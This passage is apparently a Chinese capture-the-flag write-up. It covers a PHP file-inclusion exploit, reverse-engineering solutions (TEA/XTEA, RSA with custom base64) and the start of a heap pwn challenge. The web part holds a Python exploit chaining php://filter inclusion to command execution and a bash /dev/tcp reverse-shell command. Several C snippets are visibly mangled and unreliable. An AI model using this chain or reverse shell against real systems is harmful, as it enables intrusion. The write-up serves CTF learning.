      'file': open("exp","rb+").read()
    }
    response1 = requests.post(url=url+"d5e9d6b6-33ed-4617-be5a-631bc491cff2=php://filter/string.strip_tags/resource=passwd",files=files)
    response2 = requests.get(url=url+"29e845c5-7ed5-43ca-a1e7-7dd39e67e722=../../../../../../../../../../tmp")
    a = re.findall("\[\d\] => php(.*)", response2.text)[0]#获得上传的临时文件
    data = {
      '1':'bash -c "bash -i >& /dev/tcp/ip/port  0>&1"'
        # /usr/bin/ed471efd0577be6357bb94d6R3@dF1aG /l1b/84d74210/07a4c79a/698f57d6/23b08db3/a3d0683d/Fl444gggbc304131
    }
    response3 = requests.post(url=url+"0=system&d5e9d6b6-33ed-4617-be5a-631bc491cff2=../../../../../tmp/php"+a,data=data)
然后直接执行命令反弹shell，吐槽 flag非常难找。。。。。。。。。。。。。。。。。。。
最后命令： **/usr/bin/ed471efd0577be6357bb94d6R3@dF1aG**
**/l1b/84d74210/07a4c79a/698f57d6/23b08db3/a3d0683d/Fl444gggbc304131**
## Re
###  ezmath
程序中应该故意给了错误数据，，
开始还写了一个ida动调脚本从0x2021跑到0x7f7f爆破，结果一个解都找不到。。。
虽然这题这样解不出来，还是贴一下写的动调的脚本吧（要修改原程序），，，
    from ida_dbg import *
    from ida_bytes import *
    def init():
        probase=FirstSeg()
        breakpoint1=0x14D5+probase
        rbp = get_reg_val("rbp")
        set_reg_val("rip", breakpoint1)
        patch_qword(rbp-0x44, 0)
    i = 0x2021
    while(True):
        print(">>> i: %d"%i) 
        run_to(0x14F1+FirstSeg())
        wait_for_next_event(WFNE_SUSP, -1)
        set_reg_val("edi", i)
        run_to(0x153B+FirstSeg())
        wait_for_next_event(WFNE_SUSP, -1)
        rax = get_reg_val("rax")
        if rax != 1:   
            i += 1
            init()
        else:
            print(">>> find: %d"%i)
            break
    exit_process()
然后分析程序，这其实是个数学题。。
程序在init用积分算了一个新的值改变了硬编码的0.2021，但这个新改的数据应该也是错的。。
求积分，公式推导。。
精度太高，我是穷举（0x2021-0x7f7f）来找最接近密文的值，这就多次复用了通过递推算出的积分。那就先统一算完写入文件。在读文件使用。
数据太多了，部分值：
    0.000330409855750
    0.000330369698985
    0.000330329551981
    0.000330289414732
    0.000330249287236
    0.000330209169490
    0.000330169061489
    0.000330128963230
    0.000330088874709
    0.000330048795924
    0.000330008726870
    0.000329968667544
    0.000329928617942
    0.000329888578061
    0.000329848547897
读数据文件，穷举找最接近的值。
    #include
    #include
    #include
    double enc[] = {0.00009794904266317233, 0.00010270456917442, 0.00009194256152777895,0.0001090322021913372, 0.0001112636336217534, 0.0001007442677411854,0.0001112636336217534, 0.0001047063607908828, 0.0001112818534005219,0.0001046861985862495, 0.0001112818534005219, 0.000108992856167966,0.0001112636336217534, 0.0001090234561758122, 0.0001113183108652088,0.0001006882924839248, 0.0001112590796092291, 0.0001089841164633298, 0.00008468431512187874};
    double minValue = 100.0;
    int min_index;
    char flag[100];
    double data[0x7f7f-0x2021+1];    
    int main(void)
    {
        int i, j;
        FILE *fp;
        fp = fopen("data1", "rb");
        for(i = 0x2021; i enc[i] ? ans-enc[i]:enc[i]-ans;
                if(ppp > 8)&0xff;    
        }
        puts(flag);
        return 0;    
    }
###  LongTimeAgo
计算len
sub_401DB0函数每8个一组进行bytes_to_long操作，且输入字符要为大写。
生成key和加密，加密函数为两种类型，xtea和tea，和异或操作。
如tea：
先异或解密得到（0xfd 0x1fd 0x3fd 0x7fd）：
    0x1f30678f, 0xb75b0dd4, 0x4a7cdb1e, 0x2877bc22, 0x1354c778, 0x357c3bc7, 0x738af391, 0x89b7f2ca
然后解密都稍微魔改了下的tea和xtea，动调从内存中找delat。
懒了，直接找网上的改下：
    #include 
    #include  
    void decrypt1(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4])
    {  
        unsigned int i;  
        uint32_t v0 = v[0], v1 = v[1], delta = 0x70C88617, sum = 0xE6EF3D20;  
        for(i = 0; i > 5)) + v0) ^ (sum + key[(sum>>11) & 3]);  
            sum += delta;  
            v0 -= (((v1 > 5)) + v1) ^ (sum + key[sum & 3]);  
        }  
        v[0]=v0, v[1]=v1;  
    }
    void decrypt2(uint32_t* v, uint32_t* k)
    {  
        uint32_t v0 = v[0], v1 = v[1], sum = 0xa6a53780, i;  
        uint32_t delta = 0x3D3529BC;                      
        uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];  
        for (i=0; i>5) + k3);  
            v0 -= ((v1>5) + k1);  
            sum -= delta;  
        }                                             
        v[0]=v0, v[1]=v1;  
    } 
    int main(void)
    {
        uint32_t v[2]={0x1f30678f,0xb75b0dd4};
        uint32_t const k[4]={0xfffd,0x1fffd,0x3fffd,0x7fffd};
        unsigned int r=32;
        decrypt1(r, v, k);
        //decrypt2(v, k)
        printf("解密后的数据：%x %x\n",v[0],v[1]);
        return 0;  
    }
最后注意解密的数据要大写，，，看了好久。。
###  StandOnTheGiants
关键就在native层的一个check函数。
一个rsa加密，有n和e，解还好，关键就是最后的换表base64有多个对应（+-有2个），这就有2^14种情况了。我还真就写了14个for循环，，，
最后爆出flag
    import gmpy2
    import base64
    import copy
    from Crypto.Util import number
    base = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ*+,-./:;?@+-"
    enc = "bborOT+ohG*,U:;@/gVIAZ-,t++LaZkOrk?UcSOKJ?p-J+vuSN?:e,Kc/?h-oH?:tthoqYYSPp-ZC+Yw:*jrxPymGYO/PvDOIivNYtvJ?Mi*GG+/lmqEysrTdSD+eP+moP+l?+Np/oK="
    ans = []
    for i in enc:
        if i != '=':
            ans += [base.index(i)]
    jia_ = [53, 62]
    jian_ = [55, 63]
    jia = []
    jian = []
    for i,s in enumerate(enc):
        if s == '+':
            jia += [i]
        if s == '-':
            jian += [i]
    jia_ = [53, 62]
    jian_ = [55, 63]
    qqqq = 0
    ans22 = [0]*14
    ans_ = [[0]]
    for a in range(2):
        ans22[0] = jia_[a]
        for b in range(2):
            ans22[1] = jia_[b] 
            for c in range(2):
                ans22[2] = jia_[c]
                for d in range(2):
                    ans22[3] = jia_[d]
                    for e in range(2):
                        ans22[4] = jia_[e]
                        for f in range(2):
                            ans22[5] = jia_[f]
                            for g in range(2):
                                ans22[6] = jia_[g]
                                for h in range(2):
                                    ans22[7] = jia_[h]
                                    for i in range(2):
                                        ans22[8] = jia_[i]
                                        for j in range(2):
                                            ans22[9] = jia_[j]
                                            for k in range(2):
                                                ans22[10] = jian_[k]
                                                for l in range(2):
                                                    ans22[11] = jian_[l]
                                                    for m in range(2):
                                                        ans22[12] = jian_[m]
                                                        for n in range(2):
                                                            ans22[13] = jian_[n]
                                                               asd = copy.deepcopy(ans22)
                                                               ans_ += [asd]
    p = 33372027594978156556226010605355114227940760344767554666784520987023841729210037080257448673296881877565718986258036932062711
    q = 64135289477071580278790190170577389084825014742943447208116859632024532344630238623598752668347708737661925585694639798853367
    e =  0x10001
    #print(ans_[1])
    for i in range(2**14):
        for j in range(10):
            ans[jia[j]] = ans_[i+1][j]
        for j in range(4):
            ans[jian[j]] = ans_[i+1][10+j]
        sss = ''.join(['{:0>6}'.format(bin(o)[2:]) for o in ans])
        flag = []
        for s in range(len(sss)//8):
            flag += [int(sss[8*s:8*(s+1)], 2)]
        flag = bytes(flag)
        #print(flag)
        #c = int(flag.hex(),16)
        c = number.bytes_to_long(flag)
        #print(number.bytes_to_long(flag))
        #print(c)
        n = q*p
        phi = (q-1) * (p-1)
        d = gmpy2.invert(e, phi)
        m = gmpy2.powmod(c, d, n)
        www = number.long_to_bytes(m)
        if b'flag' in www:
            print(www)
## Pwn
###  baby_diary
漏洞点
    __int64 __fastcall sub_132B(__int64 a1, int a2, char a3)
    {
      int i; // [rsp+1Ch] [rbp-4h]
      for ( i = 0; i < a2; ++i )
      {
        if ( (int)read(0, (void *)(i + a1), 1uLL) <= 0 )
        {
          puts("read error");
          exit(0);
        }
        if ( a3 == *(_BYTE *)(i + a1) )
          break;
      }
      *(_BYTE *)(i + a1) = 0;                      //设置最后一个至为0
      return (unsigned int)i;
    }
执行完编辑函数，可以修改最后一个字节的low_byte位
    void __fastcall sub_1528(unsigned int idx, int n)
    {
      __int64 v2; // [rsp+10h] [rbp-8h]